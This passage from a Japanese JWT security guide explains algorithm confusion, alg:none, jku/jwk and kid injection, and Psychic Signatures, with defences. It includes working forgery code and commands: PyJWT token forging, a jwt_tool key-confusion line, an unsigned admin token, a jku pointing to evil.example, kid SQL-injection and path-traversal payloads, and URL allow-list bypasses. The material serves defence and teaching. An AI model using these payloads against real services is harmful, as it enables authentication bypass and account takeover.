- `kid` の値は、あらかじめ許可された鍵の一覧（ホワイトリスト）に対する単純な識別子（インデックス）として扱い、**それ自体をファイルパスやURLの構築に使わない**。
- 入力値としての `kid` は信頼せず、厳密なフォーマット検証（英数字のみ等）を行う。

> 出典: JWTのセキュリティ入門（morioka12） — https://scgajge12.hatenablog.com/entry/jwt_security

### 攻撃5: ヘッダへの公開鍵埋め込み（`jwk` / `jku` ヘッダの悪用、CVE-2018-0114）

JWTの拡張ヘッダには `jwk`（JSON Web Keyをヘッダ自体に埋め込む）や `jku`（検証用の鍵セットを取得できるURLを指定する）というフィールドが存在します。これらは本来、鍵配布の利便性のために用意された仕組みですが、検証側が「ヘッダが指定する鍵をそのまま信用して検証に使う」実装になっていると、攻撃者は次のようにして偽造トークンを正当なものとして通してしまえます。

1. 攻撃者は自分で新しい鍵ペア（秘密鍵・公開鍵）を生成する。
2. 改ざんしたペイロードに対して、自分の秘密鍵で署名する。
3. ヘッダの `jwk` に自分の公開鍵を埋め込む、または `jku` に自分が用意したサーバー上の鍵セットURLを指定する。

サーバー側の検証ロジックが「ヘッダに書かれた鍵（またはヘッダが指すURL先の鍵）」を無条件に取得して検証に使ってしまうと、「攻撃者が自分の鍵で署名し、その鍵自体もヘッダで指定する」という自己完結した偽造が成立し、署名検証という仕組みが意味をなさなくなります。これはCVE-2018-0114（Node.jsの `node-jws` ライブラリ関連）として実際に報告された脆弱性クラスです。

**対策:**
- 検証に使う鍵は、サーバー側があらかじめ信頼している鍵セット（固定された設定、または信頼済みのJWKSエンドポイントのみ）から取得し、**トークン自身が指定する鍵情報（`jwk`, `jku`）を信用しない**。
- `jku` を使う設計がどうしても必要な場合は、許可するホストをホワイトリスト化する。

> 出典: JWTのセキュリティ入門（morioka12） — https://scgajge12.hatenablog.com/entry/jwt_security

### 攻撃6: アプリケーション間での秘密鍵の使い回し

同一の秘密鍵を複数のアプリケーション（あるいは複数の環境）で共有して使っている場合、片方のサービスで正規に発行されたJWTを、別のサービスにそのまま送りつけるだけで認証が通ってしまうことがあります。

**なぜ成立するのか:** JWTの検証は基本的に「署名が正しいか」「有効期限内か」といった汎用的なチェックが中心であり、**「このトークンはどのサービス向けに発行されたものか」を表す `aud`（audience）クレームをきちんと検証しているか**は実装依存です。鍵を共有していれば署名は当然正しく検証されてしまうため、`aud` クレームのチェックを怠っているサービスAとサービスBの間では、サービスAで取得したトークンをサービスBに持ち込んで不正利用する、といったクロスサービスでの権限昇格・なりすましが可能になります。

**対策:**
- ユーザーやサービスの区別が必要な文脈では、**サービスごとに異なる秘密鍵を使用**する。
- `aud` クレームを発行時に設定し、検証時に「自分向けのトークンか」を必ずチェックする。

> 出典: OWASP Authentication Threats for JSON Web Token（Akamai） — https://www.akamai.com/blog/security-research/owasp-authentication-threats-for-json-web-token

### 攻撃7: ペイロードへの機密情報の格納とトークン漏洩後の影響

すでに述べた通り、JWTのペイロードは暗号化されていないため、Base64URLデコードするだけで中身を誰でも読み取れます。これ自体は「署名による完全性の担保」というJWTの設計意図には反しませんが、実装者が「JWTだから安全」と誤解し、DB名、内部的な連番ID、権限フラグなど、本来外部に見せるべきでない情報をペイロードに入れてしまうケースが後を絶ちません。

**影響:**
- 内部実装の詳細（テーブル名、内部ID体系など）が漏洩し、他の攻撃（IDOR/Object Level Authorizationの破綻を狙った攻撃など）の足がかりを与える「過度なデータ露出（Excessive Data Exposure）」につながります。
- WebStorage（localStorage/sessionStorage）にトークンを保存している場合、XSS（クロスサイトスクリプティング。悪意あるスクリプトがページ内で実行され、任意のJavaScript処理を行える脆弱性）が一件でも存在すれば、トークンをまるごと窃取されます。
- Cookieに保存する場合は、`Secure`属性（HTTPS通信でのみ送信）、`HttpOnly`属性（JavaScriptからのアクセスを禁止しXSS経由の窃取を防ぐ）、`SameSite`属性（クロスサイトリクエストでの自動送信を制限しCSRF対策に寄与）を適切に設定することが不可欠です。

**対策:**
- ペイロードには必要最小限の非機密情報のみを含める。
- 機密性が必要なデータをどうしてもトークンに含めたい場合は、暗号化された **JWE（JSON Web Encryption）** の利用を検討する。
- 有効期限（`exp`）は必要以上に長く設定しない。漏洩時の被害時間を最小化するため短命なアクセストークンとし、長期セッションが必要な場合はリフレッシュトークンの仕組みを別途安全に設計する。

> 出典: JWTのセキュリティ入門（morioka12） — https://scgajge12.hatenablog.com/entry/jwt_security
> 出典: OWASP Authentication Threats for JSON Web Token（Akamai） — https://www.akamai.com/blog/security-research/owasp-authentication-threats-for-json-web-token

### 実例: nOAuthとJWTクレーム改ざんによるアカウント乗っ取り

Speaker Deckの資料（SECCON Beginners Live 2023、gaunt氏による発表）では、実際に発見された脆弱性事例として「nOAuth」が紹介されています。これはAzure ADを利用したOAuth/OIDC連携において、IDトークン（JWTの一種）に含まれる `email` クレームの検証が不十分だったために、攻撃者が自分のAzure ADテナントで任意のメールアドレスを名乗るユーザーを作成し、そのメールアドレスを被害者のものに一致させることでアカウント乗っ取りが可能になったという事例です。

これは、本節で解説してきた「署名検証の不備」とは異なる種類の脆弱性ですが、JWTを使う認証・認可フローにおいては「署名さえ正しければクレームの中身を無条件に信用してよい」わけではないという重要な教訓を示しています。署名は**改ざんされていないこと**の証明にはなりますが、**クレームの値そのものが業務的に正しい・検証済みであること**を保証するものではありません。

### 防御のまとめ（RFC 8725: JWT Best Current Practices準拠）

本節で紹介した攻撃はいずれも、共通して「検証ロジックがトークン自身の自己申告情報（`alg`, `kid`, `jwk`, `jku`）を過度に信用してしまう」という構造的な問題に起因しています。RFC 8725（JSON Web Token Best Current Practices）が示す原則に沿って、以下を必ず徹底してください。

1. **アルゴリズムを常にサーバー側で固定・ホワイトリスト化**し、トークンの `alg` ヘッダの値に検証ロジックを委ねない。`none` は明示的に拒否する。
2. **鍵の用途とアルゴリズムを厳密に紐付ける**（RS256用の鍵をHS256で使い回さない）。
3. HMAC使用時は**256ビット以上の高エントロピーな鍵**を使用し、可能であれば非対称アルゴリズム（できればECDSA系）へ移行する。
4. `kid`, `jwk`, `jku` などトークン側が指定する鍵関連情報は、**サーバー側の信頼済みリストに対する参照としてのみ**扱い、直接ファイルパスやURLの構築に使わない。
5. `exp`（有効期限）は短く保ち、必要に応じて失効管理（ブラックリストやリフレッシュトークンのローテーション）を実装する。
6. ペイロードには機密情報を含めず、含める場合はJWEによる暗号化を検討する。
7. `aud`（対象者）、`iss`（発行者）などのクレームも含め、**すべてのクレームを検証**する。鍵の使い回しがある場合は特に `aud` の検証が権限分離の要となる。
8. 自前で署名検証ロジックを実装せず、**十分にレビューされた最新のJWTライブラリ**を利用し、既知のCVE（CVE-2018-0114等）に対応したバージョンを使う。

これらはいずれも「防御側の実装がトークンの自己申告情報を信用しすぎない」という一点に集約されます。JWTは正しく実装されれば堅牢な認証基盤になりますが、便利さの裏でこれだけ多くの落とし穴があることを踏まえ、認証システムの設計・レビュー時には必ずチェックリスト化して確認することを推奨します。

> 出典: JWTのセキュリティ入門（morioka12） — https://scgajge12.hatenablog.com/entry/jwt_security
> 出典: JWTセキュリティ入門（Speaker Deck / melonattacker） — https://speakerdeck.com/melonattacker/jwtsekiyuriteiru-men
> 出典: OWASP Authentication Threats for JSON Web Token（Akamai） — https://www.akamai.com/blog/security-research/owasp-authentication-threats-for-json-web-token

## アルゴリズム混同（RS256→HS256）

### この節で学ぶこと

JWT（JSON Web Token）は「ヘッダ.ペイロード.署名」の3つを `.` で連結した文字列で、それぞれが Base64URL でエンコードされている。ヘッダの `alg` フィールドは「この署名を検証するときに使うべきアルゴリズム」を宣言する。**アルゴリズム混同（algorithm confusion）攻撃とは、この `alg` の宣言をサーバが鵜呑みにする実装を突き、署名の検証方式を攻撃者にとって都合のよいものへすり替える攻撃**である。

その代表格が **RS256 → HS256 のすり替え**だ。本来 RSA の秘密鍵を持つ者しか署名できないはずの `RS256` を、公開情報だけで偽造できる `HS256` へ変換してしまう。秘密鍵も共有シークレットも一切盗まずに、公開鍵という「誰でも見られる情報」だけで管理者トークンを製造できる点が、この攻撃の恐ろしさの核心である。

本節では、まず署名アルゴリズムの二種類（対称・非対称）の違いを仕組みレベルで押さえ、なぜ公開鍵が HMAC の鍵として流用できてしまうのかを数学と実装の両面から解説する。続いて実際の偽造手順、関連攻撃（`alg:none`、Psychic Signatures、`jku` 注入、`kid` インジェクション）、影響、そして防御を扱う。

> **スコープの前提**：本節は防御目的の解説である。ペイロード例は原理理解のための最小構成にとどめ、実在サービスや本番環境への無許可の検証・破壊的手順は一切記載しない。読者が自組織の実装を安全側に倒せるようになることを目的とする。

---

### 対称鍵と非対称鍵 ―― なぜ混同が成立するのか

アルゴリズム混同を理解する前提として、JWT の署名に使われる2系統のアルゴリズムを整理する。

- **HS256（HMAC-SHA256）＝ 対称鍵（symmetric）方式**
  署名も検証も**同一の秘密鍵（共有シークレット、shared secret）**を使う。`signature = HMAC-SHA256(secret, header + "." + payload)` を計算し、受信側は同じ `secret` で同じ計算をして一致するか比べるだけ。鍵を知っている者は署名も検証もできる。

- **RS256（RSA-SHA256）＝ 非対称鍵（asymmetric）方式**
  署名は**秘密鍵（private key）**でしか作れないが、検証は**公開鍵（public key）**で誰でも行える。公開鍵はその名の通り公開してよい。JWKS エンドポイント（`/.well-known/jwks.json` など）、OpenID Connect の設定、TLS 証明書、クライアント側コードなど、あちこちに露出しているのが普通である。

ここに罠がある。多くの JWT ライブラリは、検証関数に **鍵を1つの変数（`key`）として渡す設計**になっている。そして「どのアルゴリズムで検証するか」を**トークンのヘッダの `alg` から読み取る**実装が古くは主流だった。すると次の破綻が起きる。

- サーバ開発者の意図：「`key` は RSA 公開鍵。`RS256` で署名検証してほしい」
- 実際にコードがやること：`alg` が `HS256` に書き換えられていたら、「`key`（RSA 公開鍵の**バイト列**）を HMAC の共有シークレットとみなして」HMAC-SHA256 検証を実行してしまう

WorkOS の記事はこの本質を次のように述べる。「トークンは、自分がどう検証されるべきかというメタデータを持ち歩いている。もしサーバがそのメタデータを信頼すれば、攻撃者は秘密鍵も共有シークレットも一切手に入れることなく、認証システム全体を転覆できる」。

#### なぜ「公開鍵を HMAC の鍵にする」計算が攻撃者側で再現できるのか

HMAC-SHA256 は**任意のバイト列を鍵として受け付ける**。鍵が RSA 公開鍵か、ランダムなパスワードか、猫の名前かを問わない。鍵の中身の妥当性を検証しない。したがって、次の2条件が揃えば攻撃者とサーバは**まったく同じ HMAC 出力**を計算できる。

1. 同じメッセージ（＝攻撃者が作ったヘッダ＋ペイロード）
2. 同じ鍵（＝サーバの RSA 公開鍵。これは公開情報なので攻撃者も入手できる）

WorkOS の言葉を借りれば「攻撃者とサーバが同じ鍵と同じメッセージを使えば、同じ出力が得られる」。RS256 では検証にしか使えなかった公開鍵が、HS256 の文脈では**署名生成の鍵**に化けてしまうのだ。攻撃者は公開鍵を HMAC 秘密鍵として使い、自作トークンに正しい HMAC 署名を付けられる。サーバは同じ公開鍵で同じ HMAC 検証を行い、一致するので「正規のトークン」と判断する。

> 出典: JWT Algorithm Confusion Attacks — https://workos.com/blog/jwt-algorithm-confusion-attacks

---

### 攻撃の前提条件

RS256→HS256 混同が成立するには、次の3条件が揃う必要がある（DEV / aquilax.ai / jsmon.sh の各記事が共通して挙げる）。

1. **サーバがアルゴリズムをピン留め（algorithm pinning）していない**。すなわち検証時に「RS256 だけを許可する」と明示せず、`alg` ヘッダの宣言に従ってしまう。
2. **RSA 公開鍵が入手可能**。JWKS エンドポイント、OIDC discovery（`/.well-known/openid-configuration`）、CDN 配布、クライアント JS への埋め込みなどから取得できる。
3. **ライブラリが対称・非対称の検証を同じコードパスで処理する**、あるいはピン留めを強制しないバージョンである。

裏を返せば、この3つのどれか一つでも崩せば攻撃は不成立になる。防御の設計はここから逆算できる。

---

### 攻撃手順の全体像

DEV および jsmon.sh の記事に沿って、攻撃者視点の流れを追う（防御者が「どこで検知・遮断できるか」を掴むための解説であり、実サービスへの適用を意図しない）。

#### フェーズ1：偵察 ―― 公開鍵の入手

まず JWKS エンドポイントを探す。典型的なパスは次の通り。

```
/.well-known/jwks.json
/.well-known/openid-configuration
/api/auth/keys
```

JWKS は次のような JSON で、RSA 鍵なら `kty: "RSA"` と、鍵本体を表す `n`（modulus、法）と `e`（exponent、公開指数）を含む。

```json
{
  "keys": [
    {
      "kty": "RSA",
      "alg": "RS256",
      "kid": "prod-2026-01",
      "n": "0vx7agoebGcQSuu...（長いBase64URL）",
      "e": "AQAB"
    }
  ]
}
```

攻撃者は `n` と `e` から RSA 公開鍵を復元し、PEM 形式（`-----BEGIN PUBLIC KEY-----` で始まるテキスト）に変換する。この PEM のバイト列が、次段の HMAC 鍵になる。

> **なぜ PEM のバイト列が鍵になるのか**：ここが実務上の重要な落とし穴である。サーバは検証時、公開鍵を「PEM 文字列そのもの」としてメモリに保持し、それを HMAC 関数へ渡すことが多い。攻撃者は**サーバが保持しているのと寸分違わぬバイト列**（同じ PEM、同じ改行・末尾の有無）を再現する必要がある。改行コードや末尾の `\n` が1バイトでも違えば HMAC 出力が変わり、攻撃は失敗する。実際の攻略で「公開鍵は合っているのに通らない」ときは、たいていこのバイト列の不一致が原因である。

#### フェーズ2：アルゴリズムの探り（negotiation）

DEV の記事が示す判定手順が明快である。同一トークンで `alg` を差し替え、レスポンスを観察する。

- `alg` を `none` にしたトークンを送る
- `alg` を `HS256` にして公開鍵で HMAC 署名したトークンを送る

観測される反応の意味づけ：

| `alg:none` の応答 | `HS256`（公開鍵署名）の応答 | 解釈 |
|---|---|---|
| 401 | 200 | **RS256→HS256 混同が有効**である可能性が高い |
| 200 | 200 | `alg:none` も通る。複数クラスが刺さる（より深刻） |
| 401 | 401 | 少なくともこの2手法は防がれている |

> 出典: RS256 to HS256, Psychic Signatures, and alg:none on Production APIs — https://dev.to/roxdavirox/jwt-algorithm-confusion-rs256-to-hs256-psychic-signatures-and-algnone-on-production-apis-1oh7

#### フェーズ3：偽造と署名

aquilax.ai / jsmon.sh が示す偽造コードの本質は共通で、次の Python が最小例である。

```python
import jwt  # PyJWT

# 公開されている RSA 公開鍵（JWKSから復元したPEM）
rsa_public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----"""

# 公開鍵を「HMACの秘密鍵」として使い、HS256で署名する
forged_token = jwt.encode(
    {"sub": "attacker", "role": "admin", "exp": 9999999999},
    rsa_public_key_pem,        # ← 公開鍵をHMAC秘密鍵に流用
    algorithm="HS256"
)
```

**なぜこれで通るのか**：前述の通り HMAC はバイト列を無検証で鍵に採る。攻撃者が使った鍵（公開鍵 PEM）と、脆弱なサーバが検証に使う鍵（同じ公開鍵 PEM）が一致するため、HMAC 出力も一致する。`role: "admin"` や `exp: 9999999999`（遠い未来の失効時刻）といったクレーム（claim、トークンが主張する属性）は攻撃者の思うままだ。

脆弱なサーバ側（Node.js）は次のように書かれている。

```javascript
const decoded = jwt.verify(forgedToken, publicKey);
// ✓ 検証が通ってしまう —— role: "admin"
```

`jwt.verify` の第3引数（オプション）を省略しているため、`jsonwebtoken` は `alg` ヘッダを信用して HS256 検証へ分岐する。`publicKey` を HMAC シークレットとして扱い、攻撃者の署名と一致し、`{ sub:'attacker', role:'admin' }` を「検証済み」として返す。

`jwt_tool`（JWT 攻撃・診断用の定番 OSS）を使う場合、DEV / jsmon.sh は次のコマンドを挙げる。これは自組織のトークン診断に用いる想定の記述である。

```bash
# 公開鍵バイト列をHMAC秘密鍵としてHS256署名し直す
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

`-X k`（key confusion モード）が、公開鍵を HMAC 鍵に流用して署名し直す処理を担う。JWKS エンドポイントから鍵を直接取り込む機能もある。

> 出典: JWT Algorithm Confusion to Account Takeover (RS256/HS256, jku injection, kid SQLi) — https://blogs.jsmon.sh/jwt-algorithm-confusion-to-account-takeover-rs256-hs256-jku-injection-kid-sqli/

### 影響を受けたライブラリと CVE（時事性の明記）

この脆弱性は特定製品の欠陥というより、**「デフォルトで `alg` を信用する」という業界全体の設計傾向**が生んだものだった。各記事が挙げる代表例を年代・修正状況とともに整理する（記載の CVE 番号・CVSS は各記事の主張に基づく。導入時は必ず一次情報で確認すること）。

| ライブラリ / 実装 | 脆弱バージョン / CVE | 状況 |
|---|---|---|
| Node.js `jsonwebtoken` | v4.2.2 より前はヘッダの `alg` を既定で採用 | 以降は `algorithms` 指定を推奨・強制する方向へ |
| Python `PyJWT` | 1.5.0 より前は明示的アルゴリズム指定を欠く。CVE-2022-29217（1.5.0〜2.3.0、CVSS 7.5） | 2.4.0 で `algorithms` 指定必須化などの対策 |
| `python-jose` | 〜3.3.0、CVE-2024-33663（CVSS 7.4） | アルゴリズム混同関連 |
| Auth0 `java-jwt` | 3.x より前で RS256→HS256 混同 | 以降のバージョンで対策 |
| `php-jwt` / `namshi/jose`（2.x 前）/ ruby-jwt | 各実装で同種の既定挙動 | 概ねピン留め強制へ移行 |

共通パターンは「ライブラリが**アルゴリズムのピン留めを要求せず**、トークンヘッダを信用する既定挙動だった」こと。**現在の維持されているメジャー版はいずれもこの既定を改めている**が、古いバージョンに固定された本番系、放置されたフォーク、自作パーサでは今も刺さる。

### 関連する近縁の攻撃

RS256→HS256 と同じく「`alg` やヘッダを信用する」ことから生じる攻撃群を、混同されがちなので機構ごとに区別して押さえる。

#### alg:none ―― 署名そのものを剥ぎ取る

RFC 7519 は `"alg": "none"`（署名なしトークン、unsecured JWT）を許容している。初期のライブラリはこれを**明示的なオプトインなしに受理**したため、攻撃者はヘッダを `none` に書き換え、署名部分を空（`.` の後ろを空文字）にするだけで検証を回避できた。

```json
// ヘッダをこう書き換える
{ "alg": "none", "typ": "JWT" }
```

```
// 署名部が空のトークン（末尾がドットで終わる）
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
```

aquilax.ai は **大文字小文字を変えた回避**（`"None"` `"NONE"` `"nOnE"`）にも触れる。文字列比較が `alg == "none"` の完全一致だけを弾く実装だと、`None` が素通りしてしまう。

現在の位置づけについて DEV は明快である。「最もよく文書化された JWT 脆弱性だが、本番で生き残る可能性は最も低い」。2015年以降のメジャー版はいずれも既定で `alg:none` を拒否し、`allowInsecureAlgorithm` のような明示フラグがないと通らない。**RFC 8725（JWT Best Current Practices）3.1 節**は「アプリが明示的に必要としない限り、`none` を受理してはならない」と定める。ただしテストコストが「1リクエスト・30秒」と極めて低いため、診断時には必ず一度は試す価値がある、というのが DEV の結論だ。

#### Psychic Signatures（CVE-2022-21449）―― ライブラリ設定では防げない例外

DEV が特に注意を促すのがこれである。**Java（JDK 15〜18、2022年4月パッチ前）の ECDSA 検証における境界チェック漏れ**で、`r=0, s=0` の署名が**メッセージや公開鍵によらず**検証を通ってしまう。

原理はこうだ。ECDSA 検証は概ね次式が成り立つかを見る。

```
(r · s⁻¹ mod n) · G + (hash · s⁻¹ mod n) · Q = R  → その x座標が r と一致するか
```

ところが `r = s = 0` を入れると、本来禁止されるべき値なのに境界チェックがないため、DEV の表現で「すべての中間項がゼロに潰れ、`0 = 0` が成立する。この等式はメッセージや公開鍵に関係なく常に真」。結果、64バイトすべてゼロの署名（`r=0, s=0`）が鍵情報も正しいメッセージもなしに検証を通過する。

- 前提：未パッチの JDK 15〜18、API が ES256/ES384/ES512（ECDSA 系）を使用。**ライブラリの設定やアルゴリズムピン留めとは無関係**に成立する点が RS256→HS256 と決定的に異なる。
- 影響範囲：JWT に限らず、TLS 証明書、OAuth/OIDC トークン、`java.security.Signature.verify()` を ECDSA で呼ぶすべての箇所。
- 影響バージョン例：Oracle JDK 17.0.2 / 18、GraalVM Enterprise 20.3.5 / 21.3.1 / 22.0.0.2。

つまり「正しくライブラリを設定していても、JVM 実装バグゆえに刺さる」。防御は**JDK のパッチ適用**そのものである。

> 出典: RS256 to HS256, Psychic Signatures, and alg:none on Production APIs — https://dev.to/roxdavirox/jwt-algorithm-confusion-rs256-to-hs256-psychic-signatures-and-algnone-on-production-apis-1oh7

#### jku / x5u 注入 ―― 検証鍵の出所を乗っ取る

JWT ヘッダには、検証に使う鍵の在り処を示す `jku`（JWK Set の URL）や `x5u`（証明書の URL）を書ける。サーバが**ドメイン検証なしにこの URL を取得**すると、jsmon.sh の言葉で「攻撃者は URL を攻撃者管理サーバへ向け、任意の JWK Set をホストできる」。

攻撃フロー：

1. 攻撃者が自前の RSA 鍵ペアを生成
2. `"jku": "https://evil.example/.well-known/jwks.json"` を含む JWT を作成
3. サーバが攻撃者の JWKS を取得し、攻撃者の公開鍵を検証鍵として採用
4. 攻撃者は自分の秘密鍵で署名済みなので、検証は当然通る

```python
headers = {
    "alg": "RS256",
    "jku": "https://evil.example/.well-known/jwks.json",
    "kid": "attacker-key-id"
}
payload = {"sub": "admin", "role": "superadmin", "exp": 9999999999}
# 攻撃者の秘密鍵で署名する
```

jsmon.sh は URL 検証の**回避手口**も列挙する。防御側は許可リストをこれらに耐えるよう設計する必要がある。

- ドメイン混同：`https://allowed.com.evil.example/`（`allowed.com` を含むが実体は `evil.example`）
- HTTP パラメータ汚染
- 許可ドメイン上のオープンリダイレクトを経由した SSRF
- メール記法混同：`https://allowed.com@evil.example/`（`@` の前はユーザ情報で、実体は `evil.example`）

診断では `jku`/`x5u` を自分の観測用サーバ（Burp Collaborator 等）へ向け、コールバックの有無で「サーバが URL を取りに来るか」を確かめる。

#### kid インジェクション ―― 鍵探索経路を突く SQLi / パストラバーサル

`kid`（Key ID）ヘッダは「どの署名鍵を使うか」のヒントに過ぎないが、これを**無害化せずに鍵探索に使う**実装が問題を生む。

**SQL インジェクション版**：`kid` をそのまま SQL に埋め込むと、返す鍵値を攻撃者が操作できる。

```sql
-- 脆弱なクエリ
SELECT secret_key FROM signing_keys WHERE kid = '<ヘッダのkid>';
```

```
-- kid にこれを注入
x' UNION SELECT 'attacker_secret'-- -

-- 結果として組み上がるクエリ
SELECT secret_key FROM signing_keys WHERE kid = 'x'
  UNION SELECT 'attacker_secret'-- -';
-- → 'attacker_secret' が「署名鍵」として返る
```

`UNION SELECT` で攻撃者が知っている値（`attacker_secret`）を鍵として返させ、その値で HS256 署名すれば検証が通る。

```python
malicious_kid = "x' UNION SELECT 'pwned_secret'-- -"
forged_token = jwt.encode(
    {"sub": "admin", "role": "admin", "exp": 9999999999},
    "pwned_secret",          # ← SQLiで返させる予定の鍵値
    algorithm="HS256",
    headers={"kid": malicious_kid}
)
```

**パストラバーサル版**：ファイルシステムから `kid` をファイル名として鍵を読む実装なら、`"kid": "../../../../dev/null"` で**空ファイル**を鍵として読ませられる。すると鍵は「空文字列」になり、攻撃者は空の HMAC シークレットで署名すれば通る。同様に `../../etc/passwd` のような既知内容ファイルを鍵に指定する手もある。

```json
{ "alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null" }
```

その他の変種として、時間ベース SQLi 検出（`'; WAITFOR DELAY '0:0:5'-- -`）なども挙げられる。

> 出典: JWT Algorithm Confusion to Account Takeover (RS256/HS256, jku injection, kid SQLi) — https://blogs.jsmon.sh/jwt-algorithm-confusion-to-account-takeover-rs256-hs256-jku-injection-kid-sqli/

### 影響

これらの攻撃が刺さると、単一の偽造トークンで次が達成される。

- **認証バイパスと権限昇格**：非特権ユーザから `role: "admin"` へ一気に格上げ。jsmon.sh / aquilax.ai は「単一の偽造トークンによる完全なアカウント乗っ取り（ATO）」と表現する。
- **セッションの永続化**：`exp` を遠い未来に設定でき、偽造トークンは失効まで有効であり続ける。
- **横展開**：Psychic Signatures のように JWT を超えて TLS/OIDC 全般へ波及する場合もある。

WorkOS はこう総括する。「アルゴリズム混同が成立するのは、開発者が想定していることと、コードが実際にやっていることの間にギャップがあるからだ」。**公開情報だけで完全な認証バイパスに至る**点が、他の多くの脆弱性と一線を画す深刻さである。

### 防御

各記事の対策は概ね一致する。優先順位順に、**なぜ効くのか**を添えて整理する。

#### 1. アルゴリズムのピン留め（最重要・非交渉）

検証時に**許可アルゴリズムを明示**し、`alg` ヘッダの宣言を無視する。これ一つで RS256→HS256 と `alg:none` の大半を封じる。

```javascript
// Node.js（jsonwebtoken）
const decoded = jwt.verify(token, publicKey, {
  algorithms: ['RS256']   // HS256 も none も投げる
});
```

```python
# Python（PyJWT）
decoded = jwt.decode(
    token, public_key,
    algorithms=["RS256"],          # 厳格な許可リスト
    options={"verify_exp": True}
)
```

**なぜ効くのか**：検証ルーチンが「RS256 の検証パス（公開鍵での RSA 検証）」に固定され、`alg:HS256` を持つトークンは分岐すら許されず即座に例外になる。攻撃者が公開鍵で HMAC 署名しても、そもそも HMAC 検証パスに到達しない。**対称と非対称を同じ許可リストに混ぜない**ことが鉄則である。

#### 2. 鍵タイプの検証（多層防御）

ピン留めに加え、鍵オブジェクトの型がアルゴリズム要件に合うかを確かめる。WorkOS の例：

```python
from cryptography.hazmat.primitives.asymmetric import rsa

def verify_token(token, key):
    header = jwt.get_unverified_header(token)
    if header["alg"] == "RS256":
        if not isinstance(key, rsa.RSAPublicKey):
            raise ValueError("Key type mismatch for RS256")
    return jwt.decode(token, key, algorithms=["RS256"])
```

**なぜ効くのか**：RSA 公開鍵オブジェクトが HMAC 鍵（ただのバイト列）として使われる経路を、型不一致で塞ぐ。「公開鍵 PEM をバイト列として HMAC に渡す」という混同の根を断てる。

#### 3. jku / x5u / jwk / crit などヘッダ由来の鍵参照を無効化

トークンが指定する URL や埋め込み鍵を**一切信用せず**、鍵は自サーバが管理する固定エンドポイント・厳格な許可リストからのみ解決する。

```javascript
// トークン由来のURLからは決して取得しない。鍵はハードコード/環境変数から。
jwt.verify(token, process.env.JWT_PUBLIC_KEY, { algorithms: ['RS256'] });
```

**なぜ効くのか**：`jku` 注入は「検証鍵の出所をトークンが決められる」ことが根源。出所を固定すれば攻撃者は鍵をすり替えられない。どうしても動的 JWKS が必要なら、取得先ドメインを厳格な許可リスト（前述の混同記法に耐える正規化込み）で縛る。

#### 4. kid はパラメータ化クエリと厳格な形式検証で扱う

```javascript
// パラメータ化クエリで SQLi を防ぐ
const result = await db.query(
  'SELECT secret FROM keys WHERE kid = $1', [kid]
);
```

加えて、`kid` を `^[a-zA-Z0-9_-]{1,64}$` のような**厳格なパターンで検証**し、パス区切り文字（`/`, `..`）を含む値を拒否する。内部で `kid → 鍵` の対応表を保持し、外部入力を鍵探索の生の材料にしない。

**なぜ効くのか**：SQLi もパストラバーサルも「`kid` が信頼できる識別子だ」という誤った前提から生じる。パラメータ化で SQL 構文への混入を、形式検証でファイルパスへの混入を、それぞれ機構的に断てる。

#### 5. alg:none は無条件拒否し、動作を必ず確認する

ライブラリが「防いでいるはず」でも、大文字小文字変種を含めて実際にテストする。aquilax.ai / jsmon.sh はいずれも「明示的に `alg:none` を拒否せよ、そしてテストせよ」と強調する。

#### 6. 依存関係の維持と CVE 監視

古いバージョンほど危険な既定を持つ。ライブラリを最新に保ち、バージョンをピン留めしつつ CVE フィードを監視する。Psychic Signatures のように**ランタイム（JDK）自体のパッチ**が要る例もあるため、言語処理系のセキュリティ更新も対象に含める。

#### 7. トークンの短命化と失効

`exp` を短く（機微な操作では 15 分未満が目安）し、失効・ローテーション機構を用意する。万一偽造されても被害の時間窓を狭められる。

> 出典: JWT Algorithm Confusion Attacks — https://workos.com/blog/jwt-algorithm-confusion-attacks

### 設計上の教訓 ―― なぜこの問題が繰り返されるのか

WorkOS はこれを個別バグではなく**プロトコル設計の一般的失敗の一例**と位置づける。「システムが複数のアルゴリズムをサポートし、かつ受信メッセージがどのアルゴリズムを使うかに影響を及ぼせるとき、それらアルゴリズム間の相互作用が攻撃面を生む」。

JWT の根本的な設計判断ミスは、**アルゴリズム選択を「信頼できないトークンのメタデータ」に埋め込んだ**ことにある。対して COSE（CBOR Object Signing and Encryption）は、アルゴリズムを帯域外（out-of-band）で合意する設計を採り、この種の混同を構造的に避けている。

実装者として持ち帰るべき原則はシンプルだ。**「どう検証するか」を、検証される当のデータに決めさせてはならない**。アルゴリズムも鍵の出所も鍵の識別子も、すべてサーバ側の固定された信頼済み設定から決める。攻撃者が触れるトークンの中身は、あくまで「検証をパスすべき対象」であって、「検証方法の指示書」ではない。この一線を守ることが、アルゴリズム混同の全クラスに対する最も確実な防波堤である。

> 出典: JWT Algorithm Confusion Attacks — https://workos.com/blog/jwt-algorithm-confusion-attacks

## kid／jku／jwk等キー参照インジェクション

JWT（JSON Web Token）の署名検証をめぐる攻撃というと、多くの入門教材は `alg: none`（署名なしを強制する攻撃）や、RS256→HS256の「アルゴリズム混同（algorithm confusion）」ばかりを取り上げる。しかし実務のバグバウンティで高額報酬に結びつく脆弱性の多くは、それらより一段地味に見える**ヘッダ内の「キー参照フィールド」**に潜んでいる。本節では `kid`／`jku`／`jwk`／`x5u`／`x5c` という一連のフィールドを「**キー参照インジェクション（Key Reference Injection）**」という統一した攻撃クラスとして捉え、それぞれがなぜ／どのように署名検証を無力化するのかを、パーサ・実装レベルの仕組みから解説する。

まず用語を確認する。JWTは `ヘッダ.ペイロード.署名` の3つをドット区切りで並べ、それぞれをBase64url（URLセーフなBase64）でエンコードした文字列である。ヘッダには署名アルゴリズム（`alg`）に加えて、「この署名をどの鍵で検証すべきか」を示す**キー参照フィールド**を書ける。ここで決定的に重要な事実は次の一点に尽きる。

> **キー参照フィールドは、署名検証よりも「前」に処理される。**

